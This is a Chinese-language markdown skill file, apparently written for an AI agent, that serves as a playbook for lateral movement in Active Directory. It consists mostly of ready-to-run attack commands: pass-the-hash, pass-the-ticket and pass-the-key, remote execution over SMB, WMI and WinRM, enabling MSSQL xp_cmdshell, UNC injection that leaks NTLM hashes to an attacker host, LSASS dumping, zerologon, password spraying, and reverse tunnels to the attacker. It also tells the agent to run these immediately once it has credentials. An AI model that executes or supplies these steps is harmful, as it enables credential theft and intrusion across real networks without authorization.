---
name: 'lateral-movement'
description: 'AD 横向移动全集：PtH/PtT/PtK→PSExec/WMI/WinRM→RDP→委派→netexec→隧道。含决策树和反模式。'
whenToUse: '拿到域内凭据后横向移动：PtH/PtT/PtK→PSExec/WMI/WinRM→RDP→委派→netexec→隧道。'
metadata: { domain: ad-win, tier: T1 }
---

# AD 横向移动技术全集

> 🔴 **拿到域内凭据后立即执行。不爆破优先原则：PTH/PTK > PTT > PSExec > WMI > WinRM。**

## 0. 前置检查

```
[ ] 时钟同步: ntpdate -b <DC_IP>  ← 🔴 所有 Kerberos 操作的前提！
[ ] 隧道验证: ss -tlnp | grep <代理端口>; ps aux | grep chisel
[ ] 凭据去交互: 所有密码/hash/TGT 立即存文件，见 deinteractive-credentials
[ ] 工具认证模式: 每个新工具第一次认证失败 → --help 确认支持的认证方式
```

---

## 1. Pass-the-Hash (PtH) — NTLM Hash

> 无需破解密码，直接用 NT hash 认证

```
# SMB — impacket
impacket-psexec DOMAIN/user@IP -hashes :<NTHASH>
impacket-smbexec DOMAIN/user@IP -hashes :<NTHASH>
impacket-wmiexec DOMAIN/user@IP -hashes :<NTHASH>

# WinRM (需目标开启 WinRM + 管理员权限)
evil-winrm -i IP -u user -H <NTHASH>

# RDP (需 Restricted Admin 模式)
xfreerdp /v:IP /u:user /pth:<NTHASH> /cert:ignore

# netexec 一键验证
netexec smb IP -u user -H <NTHASH> --shares
netexec smb IP -u user -H <NTHASH> -x 'whoami'
netexec winrm IP -u user -H <NTHASH> -x 'whoami'
```

---

## 2. Pass-the-Ticket (PTT) — Kerberos Ticket

> 用 TGT/TGS 票据认证，不触发 4768 事件

```
# 从 Linux 导入 ccache
export KRB5CCNAME=/path/to/user.ccache
impacket-psexec DOMAIN/user@HOST -k -no-pass

# 从 Windows 注入 (Rubeus)
Rubeus.exe ptt /ticket:<base64_ticket>
Rubeus.exe asktgt /user:user /rc4:<NTHASH> /ptt  # Overpass-the-Hash

# 从 ccache 提取 TGT
impacket-ticketConverter ticket.kirbi ticket.ccache
```

---

## 3. Overpass-the-Hash / Pass-the-Key (PtK)

> 用 AES128/AES256/RC4 Key 直接申请 TGT

```
# 用 AES key 请求 TGT
impacket-getTGT DOMAIN/user -aesKey <AES_KEY>
export KRB5CCNAME=user.ccache

# Rubeus (Windows)
Rubeus.exe asktgt /user:user /aes256:<key> /ptt

🔴 AES256 Kerberoast 不可爆破 → 改用委派路径
```

---

## 4. PSExec / SMBExec / WMIExec / AtExec

```
# PSExec (写入服务二进制 → 启动服务 — 🔴 AV 常报警)
impacket-psexec DOMAIN/user@IP [-hashes :<HASH>] [-k]
# 替代: WMIExec 不落盘，更隐蔽

# SMBExec (通过 SMB 命名管道执行)
impacket-smbexec DOMAIN/user@IP [-hashes :<HASH>]

# WMIExec (WMI 远程执行)
impacket-wmiexec DOMAIN/user@IP [-hashes :<HASH>]

# AtExec (计划任务执行)
impacket-atexec DOMAIN/user@IP 'cmd.exe /c whoami' [-hashes :<HASH>]

# DCOMExec (DCOM 对象执行)
impacket-dcomexec DOMAIN/user@IP [-hashes :<HASH>]
```

---

## 5. WinRM

```
# 密码
evil-winrm -i IP -u user -p 'pass'

# Hash
evil-winrm -i IP -u user -H <NTHASH>

# Kerberos
evil-winrm -i HOST.DOMAIN -u user -k

# netexec 批量
netexec winrm IP -u user -p 'pass' -x 'whoami'
netexec winrm 192.168.1.0/24 -u user -p 'pass'  # 子网扫描
```

### 🆕 WinRM→SMB 双跳失败？
→ kerberos-double-hop — CredSSP/PTH/PSSessionConfiguration

---

## 6. RDP

```
# 密码
xfreerdp /v:IP /u:user /p:'pass' /cert:ignore +clipboard

# Hash (需 Restricted Admin)
xfreerdp /v:IP /u:user /pth:<NTHASH> /cert:ignore

# Kerberos
xfreerdp /v:HOST.DOMAIN /u:user /cert:ignore /kerberos:auto

# RDP 文件模板
full address:s:IP
username:s:DOMAIN\user
```

---

## 7. 委派攻击 → 横向

```
[ ] 非约束委派:    Get-NetComputer -Unconstrained → 诱骗 DC 或打印 Spooler
[ ] 约束委派:      Get-NetUser -TrustedToAuth → 伪造 S4U2Proxy
[ ] RBCD:           GenericWrite/WriteDacl → 添加 msDS-AllowedToActOnBehalfOfOtherIdentity
[ ] Shadow Credentials: GenericWrite → 添加 msDS-KeyCredentialLink → PKINIT
# 详细命令见 ad-checklist §3 / §5 / §8
```

---

## 8. 🆕 MSSQL 横向
```
# 连接 (🔴 必须用 FQDN!)
impacket-mssqlclient DOMAIN/user:pass@<FQDN> -windows-auth

# 启用 xp_cmdshell (sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# UNC Path Injection — 窃取 NTLM hash (不用 xp_cmdshell!)
EXEC master..xp_dirtree '\\<ATTACK_IP>\share';
# → Responder 捕获 NTLM → relay / crack

# Linked Servers — 跨 SQL 实例跳板
SELECT * FROM openquery("LINKED_SERVER", 'SELECT @@version');
EXEC ('EXEC xp_cmdshell ''whoami''') AT "LINKED_SERVER";
```

---

## 9. netexec (nxc) 横向速查

```
# SMB 执行
netexec smb IP -u user -p 'pass' -x 'whoami'
netexec smb IP -u user -H <HASH> -X 'powershell -enc <B64>'

# 批量密码喷洒
netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce

# 模块执行
netexec smb IP -u user -p 'pass' -M spider_plus
netexec smb IP -u user -p 'pass' -M lsassy        # 远程 dump LSASS
netexec smb IP -u user -p 'pass' -M nanodump
netexec smb IP -u user -p 'pass' -M wcc
netexec smb IP -u user -p 'pass' -M zerologon

# WinRM
netexec winrm IP -u user -p 'pass' -x 'whoami'
netexec winrm IP -u user -p 'pass' -L              # 列出可用模块

# LDAP
netexec ldap DC_IP -u user -p 'pass' --users
netexec ldap DC_IP -u user -p 'pass' --computers
netexec ldap DC_IP -u user -p 'pass' -M maq
netexec ldap DC_IP -u user -p 'pass' -M adcs
```

---

## 10. 多层网络横向（隧道）

> 详见 tunneling-port-forwarding

```
# chisel SOCKS5 (首选)
# 攻击机: chisel server -p 8000 --reverse
# 跳板:   chisel client <ATTACK_IP>:8000 R:socks

# ligolo-ng
# 攻击机: ligolo-proxy -selfcert
# 跳板:   ligolo-agent -connect <ATTACK_IP>:11601 -ignore-cert

# SSH 动态转发
ssh -D 1080 user@jumpbox

# proxychains 配合
proxychains -q impacket-psexec INTERNAL_DOMAIN/user@INTERNAL_IP -hashes :<HASH>
```

---

## 10. 横向决策树

```
有 NT hash → PtH (PSExec/WMIExec/WinRM)
有 AES key → PtK (getTGT) → PTT
有密码   → WinRM > PSExec > WMIExec
有 TGT    → PTT (直接 impacket -k)
有 TGS    → 仅目标服务可用 (如 MSSQL SPN)
有 GenericWrite → RBCD/Shadow Credentials
有 MSSQL sysadmin → xp_cmdshell / UNC injection / linked servers
什么也没有 → 内网扫描 → 密码喷洒
```

## 反模式

| ❌ 禁止 | ✅ 正确 |
|--------|--------|
| ❌ 拿到 hash 就爆破 | ✅ 先 PtH |
| ❌ Kerberos 失败就放弃 | ✅ 检查时钟同步 |
| ❌ SOCKS5 不稳定还硬用 | ✅ 重建隧道 / 换 ligolo |
| ❌ 用 IP 连 MSSQL | ✅ 用 FQDN (SPN 匹配) |
